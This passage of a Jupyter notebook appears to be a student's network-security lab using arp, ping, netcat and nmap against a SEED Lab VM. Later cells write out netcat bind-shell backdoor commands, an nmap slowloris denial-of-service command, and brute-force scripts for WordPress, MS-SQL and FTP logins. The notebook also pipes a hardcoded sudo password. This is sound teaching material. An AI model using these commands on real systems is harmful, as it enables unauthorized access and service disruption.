      "\r\n",
      "              The format of the file is simple; it only  contains  ASCII  text\r\n",
      "              lines  with  a  hostname,  and  a  hardware address separated by\r\n",
      "              whitespace. Additionally the p\bpu\bub\bb, t\bte\bem\bmp\bp and n\bne\bet\btm\bma\bas\bsk\bk flags can  be\r\n",
      "              used.\r\n",
      "\r\n",
      "       In  all  places  where a h\bho\bos\bst\btn\bna\bam\bme\be is expected, one can also enter an I\bIP\bP\r\n",
      "       a\bad\bdd\bdr\bre\bes\bss\bs in dotted-decimal notation.\r\n",
      "\r\n",
      "       As a special case for compatibility the order of the hostname  and  the\r\n",
      "       hardware address can be exchanged.\r\n",
      "\r\n",
      "       Each  complete  entry  in the ARP cache will be marked with the C\bC flag.\r\n",
      "       Permanent entries are marked with M\bM and published entries  have  the  P\bP\r\n",
      "       flag.\r\n",
      "\r\n",
      "E\bEX\bXA\bAM\bMP\bPL\bLE\bES\bS\r\n",
      "       /\b/u\bus\bsr\br/\b/s\bsb\bbi\bin\bn/\b/a\bar\brp\bp -\b-i\bi e\bet\bth\bh0\b0 -\b-D\bDs\bs 1\b10\b0.\b.0\b0.\b.0\b0.\b.2\b2 e\bet\bth\bh1\b1 p\bpu\bub\bb\r\n",
      "\r\n",
      "       This will answer ARP requests for 10.0.0.2 on eth0 with the MAC address\r\n",
      "       for eth1.\r\n",
      "\r\n",
      "       /\b/u\bus\bsr\br/\b/s\bsb\bbi\bin\bn/\b/a\bar\brp\bp -\b-i\bi e\bet\bth\bh1\b1 -\b-d\bd 1\b10\b0.\b.0\b0.\b.0\b0.\b.1\b1\r\n",
      "\r\n",
      "       Delete the ARP table entry for 10.0.0.1 on interface  eth1.  This  will\r\n",
      "       match published proxy ARP entries and permanent entries.\r\n",
      "\r\n",
      "F\bFI\bIL\bLE\bES\bS\r\n",
      "       _\b/_\bp_\br_\bo_\bc_\b/_\bn_\be_\bt_\b/_\ba_\br_\bp\r\n",
      "       _\b/_\be_\bt_\bc_\b/_\bn_\be_\bt_\bw_\bo_\br_\bk_\bs\r\n",
      "       _\b/_\be_\bt_\bc_\b/_\bh_\bo_\bs_\bt_\bs\r\n",
      "       _\b/_\be_\bt_\bc_\b/_\be_\bt_\bh_\be_\br_\bs\r\n",
      "\r\n",
      "S\bSE\bEE\bE A\bAL\bLS\bSO\bO\r\n",
      "       rarp(8), route(8), ifconfig(8), netstat(8)\r\n",
      "\r\n",
      "A\bAU\bUT\bTH\bHO\bOR\bRS\bS\r\n",
      "       Fred   N.  van  Kempen  <waltje@uwalt.nl.mugnet.org>,  Bernd  Eckenfels\r\n",
      "       <net-tools@lina.inka.de>.\r\n",
      "\r\n",
      "net-tools                         2008-10-03                            ARP(8)\r\n"
     ]
    }
   ],
   "source": [
    "! man arp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: Address                  HWtype  HWaddress           Flags Mask            Iface\r\n",
      "192.168.195.2            ether   00:50:56:e4:5b:86   C                     eth0\r\n",
      "192.168.195.254          ether   00:50:56:f6:02:1c   C                     eth0\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S arp -n # -n shows numerical addresses from ARP cache"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find ip of host or another VM or gateway and ping it to see the ARP cache being changed\n",
    "- $ ifconfig | grep inet \n",
    "- and ping host and then run route -n again to see the routing table"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Usage\r\n",
      "  ping [options] <destination>\r\n",
      "\r\n",
      "Options:\r\n",
      "  <destination>      dns name or ip address\r\n",
      "  -a                 use audible ping\r\n",
      "  -A                 use adaptive ping\r\n",
      "  -B                 sticky source address\r\n",
      "  -c <count>         stop after <count> replies\r\n",
      "  -D                 print timestamps\r\n",
      "  -d                 use SO_DEBUG socket option\r\n",
      "  -f                 flood ping\r\n",
      "  -h                 print help and exit\r\n",
      "  -I <interface>     either interface name or address\r\n",
      "  -i <interval>      seconds between sending each packet\r\n",
      "  -L                 suppress loopback of multicast packets\r\n",
      "  -l <preload>       send <preload> number of packages while waiting replies\r\n",
      "  -m <mark>          tag the packets going out\r\n",
      "  -M <pmtud opt>     define mtu discovery, can be one of <do|dont|want>\r\n",
      "  -n                 no dns name resolution\r\n",
      "  -O                 report outstanding replies\r\n",
      "  -p <pattern>       contents of padding byte\r\n",
      "  -q                 quiet output\r\n",
      "  -Q <tclass>        use quality of service <tclass> bits\r\n",
      "  -s <size>          use <size> as number of data bytes to be sent\r\n",
      "  -S <size>          use <size> as SO_SNDBUF socket option value\r\n",
      "  -t <ttl>           define time to live\r\n",
      "  -U                 print user-to-user latency\r\n",
      "  -v                 verbose output\r\n",
      "  -V                 print version and exit\r\n",
      "  -w <deadline>      reply wait <deadline> in seconds\r\n",
      "  -W <timeout>       time to wait for response\r\n",
      "\r\n",
      "IPv4 options:\r\n",
      "  -4                 use IPv4\r\n",
      "  -b                 allow pinging broadcast\r\n",
      "  -R                 record route\r\n",
      "  -T <timestamp>     define timestamp, can be one of <tsonly|tsandaddr|tsprespec>\r\n",
      "\r\n",
      "IPv6 options:\r\n",
      "  -6                 use IPv6\r\n",
      "  -F <flowlabel>     define flow label, default is random\r\n",
      "  -N <nodeinfo opt>  use icmp6 node info query, try <help> as argument\r\n",
      "\r\n",
      "For more details see ping(8).\r\n"
     ]
    }
   ],
   "source": [
    "! ping -h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING 192.168.195.131 (192.168.195.131) 56(84) bytes of data.\r\n",
      "64 bytes from 192.168.195.131: icmp_seq=1 ttl=64 time=0.686 ms\r\n",
      "\r\n",
      "--- 192.168.195.131 ping statistics ---\r\n",
      "1 packets transmitted, 1 received, 0% packet loss, time 0ms\r\n",
      "rtt min/avg/max/mdev = 0.686/0.686/0.686/0.000 ms\r\n"
     ]
    }
   ],
   "source": [
    "! ping -c 1 -w 1 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping -c 1 192.168.231.155"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S arp -n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# arp -d <ip> to delete entry\n",
    "! echo kali | sudo -S arp -d 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: Address                  HWtype  HWaddress           Flags Mask            Iface\r\n",
      "192.168.195.2            ether   00:50:56:e4:5b:86   C                     eth0\r\n",
      "192.168.195.254          ether   00:50:56:f6:02:1c   C                     eth0\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S arp -n #shows (incomplete) completely clearing is not easy"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### flush all entries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: 192.168.195.2 dev eth0 lladdr 00:50:56:e4:5b:86 ref 1 used 5/5/3 probes 1 REACHABLE\r\n",
      "192.168.195.254 dev eth0 lladdr 00:50:56:f6:02:1c used 494/494/448 probes 4 STALE\r\n",
      "\r\n",
      "*** Round 1, deleting 2 entries ***\r\n",
      "*** Flush is complete after 1 round ***\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ip -s -s neigh flush all"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Netcat\n",
    "- utility tool that supports a wide range of commands to manage networks and send and receive data between systems\n",
    "- more info: https://www.varonis.com/blog/netcat-commands/\n",
    "- netcat or nc are the commands used with many options"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[v1.10-45]\r\n",
      "connect to somewhere:\tnc [-options] hostname port[s] [ports] ... \r\n",
      "listen for inbound:\tnc -l -p port [-options] [hostname] [port]\r\n",
      "options:\r\n",
      "\t-c shell commands\tas `-e'; use /bin/sh to exec [dangerous!!]\r\n",
      "\t-e filename\t\tprogram to exec after connect [dangerous!!]\r\n",
      "\t-b\t\t\tallow broadcasts\r\n",
      "\t-g gateway\t\tsource-routing hop point[s], up to 8\r\n",
      "\t-G num\t\t\tsource-routing pointer: 4, 8, 12, ...\r\n",
      "\t-h\t\t\tthis cruft\r\n",
      "\t-i secs\t\t\tdelay interval for lines sent, ports scanned\r\n",
      "        -k                      set keepalive option on socket\r\n",
      "\t-l\t\t\tlisten mode, for inbound connects\r\n",
      "\t-n\t\t\tnumeric-only IP addresses, no DNS\r\n",
      "\t-o file\t\t\thex dump of traffic\r\n",
      "\t-p port\t\t\tlocal port number\r\n",
      "\t-r\t\t\trandomize local and remote ports\r\n",
      "\t-q secs\t\t\tquit after EOF on stdin and delay of secs\r\n",
      "\t-s addr\t\t\tlocal source address\r\n",
      "\t-T tos\t\t\tset Type Of Service\r\n",
      "\t-t\t\t\tanswer TELNET negotiation\r\n",
      "\t-u\t\t\tUDP mode\r\n",
      "\t-v\t\t\tverbose [use twice to be more verbose]\r\n",
      "\t-w secs\t\t\ttimeout for connects and final net reads\r\n",
      "\t-C\t\t\tSend CRLF as line-ending\r\n",
      "\t-z\t\t\tzero-I/O mode [used for scanning]\r\n",
      "port numbers can be individual or ranges: lo-hi [inclusive];\r\n",
      "hyphens in port names must be backslash escaped (e.g. 'ftp\\-data').\r\n"
     ]
    }
   ],
   "source": [
    "! nc -h"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Port scanning with Netcat\n",
    "- netcat can be used scan a host(domain or ip) to diagnose a network issues or performance problem\n",
    "- can determine whether a firewall is blocking traffic\n",
    "- didn't find a success!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali:         inet 192.168.195.157  netmask 255.255.255.0  broadcast 192.168.195.255\r\n",
      "        inet6 fe80::20c:29ff:febb:4e8a  prefixlen 64  scopeid 0x20<link>\r\n",
      "        inet 127.0.0.1  netmask 255.0.0.0\r\n",
      "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ifconfig | grep inet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "! ping -c 1 google.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# scan port from 1-1000; doesn't seem to do much\n",
    "! nc -z -v google.com 1-1000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check single port\n",
    "! nc -z -v google.com 443"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sending data over network\n",
    "- netcat can connect to udp and tcp service and send data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# download index page from washing.edu and save it to file\n",
    "# send HTTP GET request\n",
    "! printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc washington.edu 80 > washington.html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create a local Web server\n",
    "- run the following command from a terminal (server)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nc -l -p 8080\n",
    "# open a browser and go to localhost:8080"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! printf \"HTTP/1.1 200 OK \\n\\n <h1>Welcome...<h1>\" | netcat -l -p 8080\n",
    "# open browswer and point it to: localhost:8080"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Netcat File Transfer\n",
    "\n",
    "### server\n",
    "$ nc -l [port] > file_name.in # receive a file\n",
    "\n",
    "### client\n",
    "$ nc [host] [port] < file_name.out # send a file\n",
    "\n",
    "\n",
    "### Grab banner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DNS fwd/rev mismatch: google.com != den02s01-in-f14.1e100.net\n",
      "google.com [172.217.11.238] 443 (https) open\n",
      " sent 0, rcvd 0\n"
     ]
    }
   ],
   "source": [
    "! echo \"\" | nc -vv -z -w1 google.com 443"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Netcat Backdoor Shells\n",
    "\n",
    "```bash\n",
    "nc -l -p [port] -e /bin/bash # run a shell on Linux\n",
    "nc -l -p [port] -e cmd.exe # run a shell on Netcat for Windows\n",
    "```\n",
    "- run nc on a terminal and connect to it with another"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Network scaning and mapping\n",
    "\n",
    "- nmap is the most popular tool for this - https://nmap.org/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --help"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -v -A scanme.nmap.org"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scanning unauthorized system and network is illegal!\n",
    "\n",
    "### Scan SEED Lab VM\n",
    "- find IP address of the VM\n",
    "- detect OS and services"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -A 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Nmap Common Commands\n",
    "- https://securitytrails.com/blog/top-15-nmap-commands-to-scan-remote-hosts\n",
    "\n",
    "### Basic Namp Scan against IP or host\n",
    "- perfect first step quick scanning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap scanme.nmap.org"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan specific ports\n",
    "- nmap can scan all 65535 possible ports\n",
    "- you can limit to specific ports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -p 1-65535 localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# scan SEEDLab VM\n",
    "! nmap -p 22,80,443 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan multiple IP addresses\n",
    "- nmap ip1 ip2\n",
    "- nmap 1.1.1.1,2,3,4 # consecutive ip addresses\n",
    "\n",
    "### Scan IP ranges\n",
    "- Classless Inter-Domain Routing (CIDR) notation: https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing\n",
    "    - See IPv4 CIDR blocsk section for quick reference\n",
    "- nmap 192.168.195.0/24 # Scan $2^8=256$ hosts in 195 subnet; class C\n",
    "- nmap 192.168.195.* # scan all 256 hosts from .1 to .256; class\n",
    "- nmap 192.168.195.10-100 # scan host from .10 to .100\n",
    "- nmap 192.168.195.* --exclude 192.168.195.1\n",
    "\n",
    "### Scan the most popular ports\n",
    "- scan top N most popular ports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --top-ports 10 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan hosts and IP addresses reading from a text file\n",
    "- create a text file (hosts.txt) with ip address and host names one per line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! printf \"192.168.195.131\\nscanme.nmap.org\" > hosts.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat hosts.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -iL hosts.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save scan results to a file\n",
    "- oN - normal format\n",
    "- oX - xml format"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -oN nmapResults.txt localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat nmapResults.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -oX nmapResults.xml localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat nmapResults.xml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan + OS and service detection with fast execution\n",
    "- T4 - for faster execution"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -A -T4 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Detect Service/daemon version\n",
    "- -sV parameter does it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -sV 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan TCP or UDP based services\n",
    "- -sT - scan TCP-based services (most services use TCP)\n",
    "- sU - scan UDP-based services"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --top-ports 10 -sU 192.168.195.131\n",
    "# a little slower"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CVE detection using Nmap\n",
    "- Nmap supports Nmap Scripting Engine (NSE)\n",
    "- Nmap can be scripted using Lua programming language\n",
    "- can use pre-defined scripts or write your own\n",
    "\n",
    "- run a full vulnerability scan on a target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -Pn --script vuln 192.168.195.131\n",
    "# takes a while!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Denial of Service (DOS) attack with Nmap\n",
    "nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true\n",
    "\n",
    "### Launching brute force attacks\n",
    "\n",
    "### WordPress brute force attack\n",
    "nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' [target]\n",
    "\n",
    "### MS-SQL Brute force attack\n",
    "nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt [target]\n",
    "\n",
    "### FTP Brute force attack\n",
    "nmap --script ftp-brute -p 21 [target]\n",
    "\n",
    "SEED Lab has FTP port 21 open and an accout with user:user; let's brute force it!\n",
    "- doesn't find seed:dees - interesting!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --script ftp-brute -p 21 192.168.195.131\n",
    "# may take a while!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Detecting malware infection on remote hosts\n",
    "- nmap may detect malware and backdoors by running extensive tests on popular OS services like:\n",
    "    - IDENTD, Proftpd, Vsftpd, IRC, SMB, and SMTP\n",
    "- it also checks Google's Safe Browsing and VirusTotal databases"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -sV --script=http-malware-host 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# use Google's malware check\n",
    "! nmap -p 80 --script http-google-malware 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
